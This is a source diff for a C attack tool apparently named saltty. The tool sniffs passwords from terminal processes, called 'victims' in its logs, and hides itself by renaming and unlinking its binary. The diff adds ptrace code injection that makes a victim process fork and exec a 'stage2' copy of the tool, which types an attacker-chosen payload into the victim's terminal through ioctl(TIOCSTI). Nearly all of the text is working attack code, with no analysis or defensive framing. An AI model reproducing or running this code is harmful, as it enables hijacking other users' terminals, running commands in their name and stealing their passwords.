@@ -24,7 +24,7 @@
 #include "saltty.h"
 #include "conf.h"
 
-#define PERROR(str) fprintf(logfile, str ": %s", strerror(errno))
+#define PERROR(str) fprintf(logfile, str ": %s\n", strerror(errno))
 
 #define SYSCALL(ret, sys, p1, p2, p3) {\
 	uint64_t __ret;\
@@ -62,6 +62,12 @@
 	}\
 }
 
+#define GET_STRLEN(str, res) {\
+	size_t i; \
+	for (i = 0; str[i] != 0; i++); \
+	res = i;\
+}
+
 #define TRAP asm ("int $3")
 
 typedef void (*handler_t)(state_t *st);
@@ -73,6 +79,9 @@ handler_t handler_sniff[] = HANDLER_LIST;
 pthread_cond_t cond = PTHREAD_COND_INITIALIZER;
 pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;
 FILE *logfile;
+
+
+int push(char *str);
 
 int process_info(int pid) {
 	int fd;
@@ -222,6 +231,36 @@ void monitor(int msec, char **files, action_t filter, state_t *state) {
 	close(fd);
 }
 
+
+__attribute__ ((aligned(8)))
+void forceexec() {
+	char *path;
+	char *args[2];
+	int r;
+	asm (
+		"lea 0(%%rip), %0"
+		: "=r" ((uint64_t) path)
+		: 
+		: "memory"
+	);
+
+	path = (char*)((uint64_t)path & ~(PAGE_SIZE - 1)) + (PAGE_SIZE >> 1);
+
+	SYSCALL(r, SYS_fork, 0, 0, 0);
+	if (r != 0)
+		TRAP;
+	
+	SYSCALL(r, SYS_fork, 0, 0, 0);
+	if (r != 0)
+		SYSCALL(r, SYS_exit, 0, 0, 0);
+
+	GET_STRLEN(path, r);
+	args[0] = path;
+	args[1] = path + r + 1;
+	args[2] = NULL;
+	SYSCALL(r, SYS_execve, path, args, NULL);
+}
+
 __attribute__ ((aligned(8)))
 void passfd() {
 	char *path;
@@ -272,7 +311,7 @@ void passfd() {
 }
 
 
-int do_injection(int pid, state_t *state) {
+int do_injection(int pid, state_t *state, int is_ctty) {
 	struct user_regs_struct urs, saved_regs;
 	struct sockaddr_un local;
 	struct sockaddr_un remote;
@@ -281,6 +320,7 @@ int do_injection(int pid, state_t *state) {
 	struct cmsghdr *cmsg;
 	char buf[256];
 	char template[32];
+	char forceexec_paths[32];
 	char dirpath[32];
 	uint64_t backup[PAGE_SIZE / 8];
 	uint64_t addr;
@@ -290,33 +330,40 @@ int do_injection(int pid, state_t *state) {
 	unsigned char *data;
 	uint8_t *ptr;
 	char *sockpath;
+	uint8_t *fn; 
+	uint64_t *path;
 
-
-	fprintf(logfile, "Injecting tty-stealer...\n");
+	if (is_ctty) {
+		fprintf(logfile, "Forcing the victim process to do our bidding...\n");
+	} else {
+		fprintf(logfile, "Injecting tty-stealer...\n");
+	}
 	sock = socket(AF_UNIX, SOCK_STREAM, 0); 
 	if (sock == -1)  {
 		PERROR("socket");
 		return -1;
 	}
-	memset(&local, 0, sizeof(local));
-	local.sun_family = AF_UNIX;
-	strcpy(template, TMPDIR "/sockXXXXXX");
-	sockpath = mkdtemp(template);
-	if (!sockpath) {
-		PERROR("mkdtemp");
-		return -1;
-	}
-	strcpy(dirpath, sockpath);
-	strcat(sockpath, "/sock");
+	if (!is_ctty) {
+		memset(&local, 0, sizeof(local));
+		local.sun_family = AF_UNIX;
+		strcpy(template, TMPDIR "/sockXXXXXX");
+		sockpath = mkdtemp(template);
+		if (!sockpath) {
+			PERROR("mkdtemp");
+			return -1;
+		}
+		strcpy(dirpath, sockpath);
+		strcat(sockpath, "/sock");
 
-	strcpy(local.sun_path, sockpath);
-	if (bind(sock, (struct sockaddr *) &local, sizeof(local)) == -1) {
-		PERROR("bind");
-		return -1;
-	}
-	if (listen(sock, 5) == -1) {
-		PERROR("listen");
-		return -1;
+		strcpy(local.sun_path, sockpath);
+		if (bind(sock, (struct sockaddr *) &local, sizeof(local)) == -1) {
+			PERROR("bind");
+			return -1;
+		}
+		if (listen(sock, 5) == -1) {
+			PERROR("listen");
+			return -1;
+		}
 	}
 	if (ptrace(PTRACE_GETREGS, pid, NULL, &urs) == -1) {
 		PERROR("getregs");
@@ -334,15 +381,25 @@ int do_injection(int pid, state_t *state) {
 			return -1;
 		}
 	}
+
+	if (is_ctty) {
+		fn = (uint8_t *)forceexec;
+		strcpy(forceexec_paths, state->myname);
+		strcpy(forceexec_paths + strlen(state->myname) + 1, "stage2");
+		path = (uint64_t *)forceexec_paths;
+	} else {
+		fn = (uint8_t *)passfd;
+		path = (uint64_t *)sockpath;
+	}
                       
-	for (ptr = (uint8_t*)passfd; ptr < (uint8_t*)passfd + PAGE_SIZE; ptr += 8)
-		if (ptrace(PTRACE_POKETEXT, pid, addr + (ptr - (uint8_t*)passfd), *((uint64_t *)ptr)) == -1) {
+	for (ptr = (uint8_t*)fn; ptr < (uint8_t*)fn + PAGE_SIZE; ptr += 8)
+		if (ptrace(PTRACE_POKETEXT, pid, addr + (ptr - (uint8_t*)fn), *((uint64_t *)ptr)) == -1) {
 			PERROR("poketext");
 			return -1;
 		}
                       
 	for (i = 0; i < 32; i++ )
-		if (ptrace(PTRACE_POKETEXT, pid, addr + (PAGE_SIZE >> 1 ) + i*8 , *(((uint64_t*) sockpath) + i)) == -1) {
+		if (ptrace(PTRACE_POKETEXT, pid, addr + (PAGE_SIZE >> 1 ) + i*8 , *(((uint64_t*) path) + i)) == -1) {
 			PERROR("poketext");
 			return -1;
 		}
@@ -359,7 +416,7 @@ int do_injection(int pid, state_t *state) {
 	}
 	if (WIFSTOPPED(wi) && WSTOPSIG(wi) != SIGTRAP) {
 		ptrace(PTRACE_GETREGS, pid, NULL, &urs);
-		fprintf(logfile, "Injected code got unexpected signal %u at RIP=%lx (translated: %lx)\n", WSTOPSIG(wi), urs.rip, (urs.rip - addr) + passfd);
+		fprintf(logfile, "Injected code got unexpected signal %u at RIP=%lx (translated: %lx)\n", WSTOPSIG(wi), urs.rip, (urs.rip - addr) + fn);
 			return -1;
 	}
 	fprintf(logfile, "Injected code finished execution, restoring original process context...\n");
@@ -378,6 +435,10 @@ int do_injection(int pid, state_t *state) {
 	if (ptrace(PTRACE_SETREGS, pid, NULL, &saved_regs) == -1) {
 		PERROR("restore regs");
 		return -1;
+	}
+	if (is_ctty) {
+		ptrace(PTRACE_DETACH, pid, NULL, NULL);
+		exit(0);
 	}
   
 	memset(&remote, 0, sizeof(remote));
@@ -419,6 +480,7 @@ int steal_tty(int pid,  state_t *state) {
 	char link[512];
 	struct stat st;
 	int forward_signal = 0;
+	int is_ctty = 0;
 	
 	snprintf(path, 512, "/proc/%u/fd/0", pid);
 	if ((r = readlink(path, link, sizeof(link))) <= 0) {
@@ -434,6 +496,14 @@ int steal_tty(int pid,  state_t *state) {
 	if (!strstr(link, "pts") && !strstr(link, "tty"))
 		return -1; 
 	fprintf(logfile, "Victim process found: %d (on tty: %s)\n", pid, link);
+#ifdef ATTEMPT_TIOCSTI
+	if (process_info(pid)) {
+		fprintf(logfile, "Victim process has a controlling terminal! Attempting ioctl(TIOCSTI) attack.\n");
+		is_ctty = 1;
+	} else {
+		fprintf(logfile, "Victim process has no controlling terminal, ioctl(TIOCSTI) attack not possible. Attempting to recover passwords.\n");
+	}
+#endif
 
 	for (;;) {
 		if (waitpid(pid, &wi, 0) == -1)  {
@@ -463,7 +533,7 @@ int steal_tty(int pid,  state_t *state) {
 			ptrace(PTRACE_SYSCALL, pid, NULL, si.si_signo);
                 } else break; 
 	}
-	return do_injection(pid, state);
+	return do_injection(pid, state, is_ctty);
 }
 
 void *reader_routine(void *data) {
@@ -511,6 +581,18 @@ ssize_t read_tty(state_t *st, void *buf, size_t count) {
 	return read(st->rfd, buf, count);
 }
 
+int push(char *str) {
+	size_t i;
+	write(1, "\r", 1);
+	for (i = 0; i < strlen(str); i++)
+		ioctl(0, TIOCSTI, str + i, 1);
+	usleep(100); //TODO: make this more reliable
+	write(1, "\033[1A", 4);
+	ioctl(0, TIOCSTI, "\n", 1);
+	return 0;
+
+}
+
 int main(int argc, char **argv) {
 	state_t st;
 	int pipetab[2];
@@ -520,6 +602,11 @@ int main(int argc, char **argv) {
 	char *ptr;
 	int fd, wfd, r, i;
 
+	if (argc == 2 && !strcmp(argv[1], "stage2")) {
+		sleep(PUSH_DELAY);
+		push(PUSH_PAYLOAD);
+		exit(0);
+	} 
 	if (!getenv("HIDDEN")) {
 		// We hide by copying binary, because the argv[0] trick fail to work with some process listing tools.
 		strcpy(path, TMPDIR "/dirXXXXXX");
@@ -551,7 +638,7 @@ int main(int argc, char **argv) {
 		close(fd);
 		close(wfd);
 		putenv("HIDDEN=1");
-		execl(path, HIDDEN_NAME, NULL);
+		execl(path, HIDDEN_NAME, mypath, NULL);
 		perror("execl");
 		exit(0);
 	}
@@ -561,6 +648,7 @@ int main(int argc, char **argv) {
 		perror("readlink");
 		exit(1);
 	}
+	st.myname = argv[1];
 	if (unlink(mypath) == -1) {
 		perror("unlink");
 		exit(1);
@@ -605,6 +693,7 @@ int main(int argc, char **argv) {
 		st.rfd = pipetab[0];
 		for (i = 0; i < READER_THREADS; i++) 
 			pthread_create(&st.threads[i], NULL, reader_routine, (void*) &st);
+
 		fprintf(logfile, "Waiting for sniffable process...\n");
 		monitor(0, monitor_sniff, filter_sniff, &st);
 		fprintf(logfile, "Sniffable process found: %s\n", st.name);
